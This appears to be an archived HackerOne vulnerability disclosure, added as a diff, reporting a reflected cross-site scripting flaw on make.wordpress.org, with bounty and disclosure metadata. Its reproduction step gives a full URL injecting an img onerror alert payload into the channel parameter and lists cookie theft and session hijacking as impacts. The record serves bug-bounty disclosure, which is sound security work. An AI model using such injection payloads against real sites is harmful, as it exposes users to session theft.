@@ -1,0 +1,27 @@
+ReportLink:https://hackerone.com/reports/659419
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/gnux
+ReportedTo:WordPress(wordpress)
+BountyAmount:387.5
+Severity:high
+State:Closed
+DateOfDisclosure:26.08.2019 0:45:03
+
+Summary:
+
+Hi there,
+I just found a reflected XSS on make.wordpress.org domain.
+
+steps to reproduce : 
+1. visit this link :
+https://make.wordpress.org/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E&date=2019-07-21&no_bots=1
+2. xss pop up will occurs
+
+POC:
+see:wp reflected xss.png
+
+Note: it works on the latest version of firefox
+
+## Impact
+
+some of xss impact like stealing cookies, session hijacking, etc ..
